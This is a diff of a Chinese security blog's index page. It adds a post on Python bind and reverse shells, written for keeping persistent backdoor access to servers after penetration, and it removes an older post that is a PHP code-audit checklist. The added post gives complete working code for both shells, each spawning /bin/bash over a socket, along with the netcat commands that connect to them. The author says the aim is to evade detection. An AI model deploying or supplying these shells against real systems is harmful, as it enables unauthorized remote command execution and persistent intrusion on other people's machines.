@@ -258,6 +258,201 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/17/基于python的直连shell和反射shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/06/17/基于python的直连shell和反射shell/" itemprop="url">
+                  基于python的直连shell和反射shell
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-17T15:09:30+08:00">
+                2018-06-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/06/17/基于python的直连shell和反射shell/" class="leancloud_visitors" data-flag-title="基于python的直连shell和反射shell">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>每次对服务器进行了渗透和提权之后，下一步就该维持权限（留后门），方便我们下次执行命令，留一个后门比起每次重新从webshell进入，一是降低被发现的概率，二是免去繁琐的操作，三是如果web漏洞被修补webshell被查杀，有时候我们放进去隐藏较好的后门并没有被查杀，我们仍然可以控制这台机器。</p>
+<p>这里介绍两个可以通过netcat连接的python版shell。</p>
+<h2 id="0x01-需要的库"><a href="#0x01-需要的库" class="headerlink" title="0x01 需要的库"></a>0x01 需要的库</h2><ul>
+<li>os： os模块提供了非常丰富的方法用来处理文件和目录。</li>
+<li>subprocess： subprocess是Python 2.4中新增的一个模块，它允许你生成新的进程，连接到它们的 input/output/error 管道，并获取它们的返回（状态）码。我们这里主要使用subprocess.call()函数，执行指定的命令，并返回命令执行状态。</li>
+<li>socket:  Python 提供了两个基本的 socket 模块。第一个是 Socket，它提供了标准的 BSD Sockets API。第二个是 SocketServer，它提供了服务器中心类，可以简化网络服务器的开发。</li>
+<li>optparse： optparse模块用来处理命令行参数，使我们在统一管理时更方便。</li>
+</ul>
+<h2 id="0x02-直连型shell"><a href="#0x02-直连型shell" class="headerlink" title="0x02 直连型shell"></a>0x02 直连型shell</h2><p>先贴代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#filename:zshell.py</span><br><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    server = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    server.bind((&apos;0.0.0.0&apos;, 2333))</span><br><span class="line">    server.listen(5)</span><br><span class="line">    print (&apos;waiting for connect&apos;)</span><br><span class="line">    while 1:</span><br><span class="line">        talk, addr = server.accept()</span><br><span class="line">        print(&apos;connect from&apos;, addr)</span><br><span class="line">        proc = subprocess.Popen([&quot;python -c &apos;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&apos;&quot;],</span><br><span class="line">                                stdin=talk,</span><br><span class="line">                                stdout=talk,</span><br><span class="line">                                stderr=talk,</span><br><span class="line">                                shell=True)</span><br></pre></td></tr></table></figure></p>
+<p>这段代码的作用是，创建一个在2333端口监听任意ip的socket，如果监听到连接，就打开一个/bin/bash进程提供给目标ip执行命令。</p>
+<p>我们要使用他时，只需在目标服务器执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python zshell.py</span><br></pre></td></tr></table></figure></p>
+<p>然后在我们自己的机器使用netcat输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;服务器ip&gt; 2333</span><br></pre></td></tr></table></figure></p>
+<p>就可以连接服务器执行命令，演示效果如下，主机是kali，靶机是ubuntu：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_shell/shell01.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_shell/shell02.png" alt=""></p>
+<h2 id="0x03-反射型shell"><a href="#0x03-反射型shell" class="headerlink" title="0x03 反射型shell"></a>0x03 反射型shell</h2><p>有时我们并不能直接访问目标服务器，这个时候可以通过反射shell来连接，也就是在我们本机使用netcat创建监听，然后让服务器上主动连接我们：<br>先贴要放在服务器端的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#filename：fshell.py</span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import subprocess</span><br><span class="line">import optparse</span><br><span class="line"></span><br><span class="line">def connect_shell(HOST,PORT):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line">    # 重定向shell输出</span><br><span class="line">    os.dup2(s.fileno(), 0)</span><br><span class="line">    os.dup2(s.fileno(), 1)</span><br><span class="line">    os.dup2(s.fileno(), 2)</span><br><span class="line">    # 执行子程序</span><br><span class="line">    p = subprocess.call([&apos;/bin/bash&apos;, &apos;-i&apos;])</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser()</span><br><span class="line">    parser.add_option(&apos;-H&apos;, dest=&apos;HOST&apos;, type=&apos;string&apos;, help=&quot;IP address or Website&quot;)</span><br><span class="line">    parser.add_option(&apos;-p&apos;, dest=&apos;PORT&apos;, type=&apos;int&apos;, help=&quot;Port num&quot;)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    if(options.HOST==None)|(options.PORT==None):</span><br><span class="line">        print(&apos;---wrong input!---&apos;+&apos;\n&apos;)</span><br><span class="line">        exit(0)</span><br><span class="line">    else:</span><br><span class="line">        HOST = options.HOST</span><br><span class="line">        PORT = options.PORT</span><br><span class="line">    while(1):</span><br><span class="line">        try:</span><br><span class="line">            connect_shell(HOST,PORT)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">if __name__ ==&apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+<p>我们在服务端执行此代码，通过命令行参数传入我们本机的ip和监听端口，然后创建向传入的ip和端口的socket连接，再重定向shell之后通过subprocess.call调用/bin/bash来执行命令。</p>
+<p>我们要使用它时，首先在本机输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure></p>
+<p>然后在服务端运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fshell.py -H &lt;我们自己机器的ip&gt; -p 2333</span><br></pre></td></tr></table></figure></p>
+<p>就可以连接服务器执行命令，演示效果如下，主机是kali，靶机是ubuntu：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_shell/shell03.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/python_shell/shell04.png" alt=""></p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>除了python，其他语言也能实现这些功能，具体使用哪种语言根据目标系统存在的环境来选择，而linux系统都是集成了python环境的，所以这里用python做例子。</p>
+<p>在留后门的过程中，重点并不是写出这个shell，而是如何隐藏它不被发现，下一次有时间会总结一下隐藏shell的各种方式。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/04/基于python的ddos工具/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2393,224 +2588,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/11/代码审计总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/05/11/代码审计总结/" itemprop="url">
-                  代码审计总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-11T22:44:48+08:00">
-                2018-05-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/05/11/代码审计总结/" class="leancloud_visitors" data-flag-title="代码审计总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在锻炼自己的代码审计能力，所以准备总结一下审计的方法和技巧。</p>
-<h2 id="0x01-漏洞类型"><a href="#0x01-漏洞类型" class="headerlink" title="0x01 漏洞类型"></a>0x01 漏洞类型</h2><ul>
-<li>sql注入</li>
-<li>xss</li>
-<li>文件包含</li>
-<li>文件上传</li>
-<li>反序列化</li>
-<li>csrf</li>
-<li>ssrf</li>
-<li>代码执行</li>
-</ul>
-<h2 id="0x02-sql注入"><a href="#0x02-sql注入" class="headerlink" title="0x02 sql注入"></a>0x02 sql注入</h2><h4 id="基本sql注入"><a href="#基本sql注入" class="headerlink" title="基本sql注入"></a>基本sql注入</h4><p>对于基本的sql注入的审计，可以通过$_GET,$_POST等传参追踪数据库操作，也可以通过select , delete , update,insert 数据库操作语句反追踪传参。</p>
-<p>主要注意查看有无过滤，有没有转义，有没有参数化。</p>
-<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>在关键部分经过转义等操作也不是完全高枕无忧了，如果代码中存在一些utf-8、gbk、big5等编码的函数，就很有可能被传入一些字符吃掉反斜杠，如%df’ and ‘ 1=1’，由于反斜杠是%5c，%df%5c在编码处理时组成了“運”这种情况，使过滤功亏一篑，所以在这些存在编码的位置，要分析并测试会不会引起上述问题。</p>
-<h4 id="httpheader的参数"><a href="#httpheader的参数" class="headerlink" title="httpheader的参数"></a>httpheader的参数</h4><p>有些系统可能会将referer，X_Forwarded_For还有cookie等参数传入数据库，一般的防注入系统考虑了get和post的参数值，而忽略了这些值的检测，并且这些值都是用户可以控制的，所以也要关注一下。</p>
-<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>攻击payload首先被Web服务器上的应用存储，随后又在关键操作中被使用，这就是二次注入。虽然我们在第一次注入的时候做了足够的过滤，但是第一次构造出可能在第二次调用时触发的payload引发注入，所以在重复利用输入的值的位置需要额外注意。</p>
-<h4 id="文件名注入"><a href="#文件名注入" class="headerlink" title="文件名注入"></a>文件名注入</h4><p>php.ini中配置安全策略可以隔绝相当一部分的sql注入，比如magic_quote_gpc=on开启之后，能实现addslshes()和stripslashes()这两个函数的功能，但是这些功能不会过滤因为$_FILE，$_SERVER之类的值</p>
-<p>有些cms会把文件名name的值保存在数据库里，但又没有对name进行过滤，可能会造成注入，所以在有对文件名处理的位置，除了考虑文件上传漏洞，也不要忘记分析一下产生sql注入的可能。</p>
-<h2 id="0x03-xss"><a href="#0x03-xss" class="headerlink" title="0x03 xss"></a>0x03 xss</h2><h4 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h4><p>反射型xss审计的时候基本的思路都一样，通过寻找可控没有过滤（或者可以绕过）的参数，通过echo等输出函数直接输出。寻找的一般思路就是寻找输出函数，再去根据函数寻找变量。一般的输出函数有这些：print , print_r , echo , printf , sprintf , die , var_dump ,var_export。</p>
-<h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><p>存储型xss审计和反射型xss审计时候思路差不多，不过存储型xss会在数据库中转一下，注意审计sql语句update ,insert更新和插入。</p>
-<h4 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h4><p>基于DOM的跨站脚本XSS：通过访问document.URL 或者document.location执行一些客户端逻辑的javascript代码。不依赖发送给服务器的数据。</p>
-<p>审计DOM型XSS时，关注输入可以影响的document.URL等位置。</p>
-<h2 id="0x04-文件包含"><a href="#0x04-文件包含" class="headerlink" title="0x04 文件包含"></a>0x04 文件包含</h2><p>PHP的文件包含可以直接执行包含文件的代码，包含的文件格式是不受限制的，只要能正常执行即可。</p>
-<p>文件包含分为本地包含和远程包含。</p>
-<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>服务器的php配置中选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，会产生远程文件包含的问题，所以面对这种问题，着重看是否打开了这两个配置选项。</p>
-<p>如果非要用到远程文件，在include() ; include_once() ; require();require_once()等代码的位置，要将文件名限制为固定值，完全无法被用户控制。</p>
-<h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>本地文件包含要查看的代码段和远程文件包含一样，主要查看<br>include() ; include_once() ; require();require_once()这四个函数的位置，要着重查看参数是否外部可控，尽量使其固定。</p>
-<p>如果必须要求可控的话，查看是否经历了白名单验证文件名，或者通过函数过滤了危险的字符如“../”。</p>
-<h2 id="0x05-文件上传"><a href="#0x05-文件上传" class="headerlink" title="0x05 文件上传"></a>0x05 文件上传</h2><p>文件上传漏洞需要审计的部分是上传函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file();</span><br></pre></td></tr></table></figure></p>
-<p>在这个函数周围，要查看是否后端检查，检查的是后缀，文件头，还是content-type。如果检查的是文件头和content-type，即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getimagesize()</span><br><span class="line">mime_content_type()</span><br></pre></td></tr></table></figure></p>
-<p>等就会产生风险。<br>还要检查是黑名单过滤还是白名单过滤，如果是黑名单过滤，则要检查是否过滤全面了（大小写等）。</p>
-<p>如果代码中没有将文件名整体重命名的函数，建议在这里加一个提升安全性。</p>
-<p>除了代码中需要检查的部分，还要检查服务器的配置文件和php插件php-cgi等，以及服务器版本是否存在解析漏洞。</p>
-<p>ps：文件上传这里，比起代码审计更好的方式是采取黑盒测试。</p>
-<h2 id="0x06-反序列化"><a href="#0x06-反序列化" class="headerlink" title="0x06 反序列化"></a>0x06 反序列化</h2><p>php反序列化的审计，主要是查找 unserialize();函数的位置。</p>
-<p>观察unserialize();函数的参数是否是用户可控的，如果可控就很容易被利用，再观察对传入参数的过滤函数检查情况。</p>
-<h2 id="0x07-csrf"><a href="#0x07-csrf" class="headerlink" title="0x07 csrf"></a>0x07 csrf</h2><p>csrf跨站请求伪造漏洞审计时主要查看在登陆后提交的代码部分，有没有通过token和referer对用户身份的合法性进行验证。还有整体有没有设置跨域权限。</p>
-<h2 id="0x08-ssrf"><a href="#0x08-ssrf" class="headerlink" title="0x08 ssrf"></a>0x08 ssrf</h2><p>对于ssrf服务端请求伪造的审计，主要去找curl命令等接收远程请求的位置有没有过滤返回信息，验证远程服务器对请求的响应，查看有没有禁用不需要的协议。</p>
-<h2 id="0x09-代码、命令执行"><a href="#0x09-代码、命令执行" class="headerlink" title="0x09 代码、命令执行"></a>0x09 代码、命令执行</h2><p>首先来说一下命令执行，命令执行就是调用系统命令cmd或者应用指令bash，审计的时候去找会执行命令的函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">passthru()</span><br><span class="line">pcntl_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br></pre></td></tr></table></figure></p>
-<p>然后查看这些位置有没有严格的过滤规则。</p>
-<p>代码执行漏洞会将可执行代码放在webservice中执行，审计代码执行漏洞时，可以去寻找php中将字符串转换成代码并执行的函数，主要去搜索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br><span class="line">asset()</span><br><span class="line">preg_replace()</span><br><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">array_map()</span><br></pre></td></tr></table></figure></p>
-<p>然后查看这些位置有没有严格的过滤规则。</p>
-<h2 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h2><p>上述这些漏洞的原理都基本写过一遍，大部分也做了复现，所以这里不再详细解释，只是整理一下审计过程中需要注意的位置，留作笔记。</p>
-<p>顺便送上两张代码审计的思维导图</p>
-<p>php代码审计导图：<br><a href="https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%84%91%E5%9B%BE.png" target="_blank" rel="noopener">https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%84%91%E5%9B%BE.png</a></p>
-<p>python代码审计导图：<br><a href="https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/Python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%84%91%E5%9B%BE.jpg" target="_blank" rel="noopener">https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/Python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%84%91%E5%9B%BE.jpg</a></p>
-<p>代码审计的溢出导图：<br><a href="https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9A%84%E6%BA%A2%E5%87%BA%E8%84%91%E5%9B%BE.png" target="_blank" rel="noopener">https://github.com/echohun/tools/blob/master/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9A%84%E6%BA%A2%E5%87%BA%E8%84%91%E5%9B%BE.png</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2660,7 +2637,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">99</span>
+                <span class="site-state-item-count">100</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
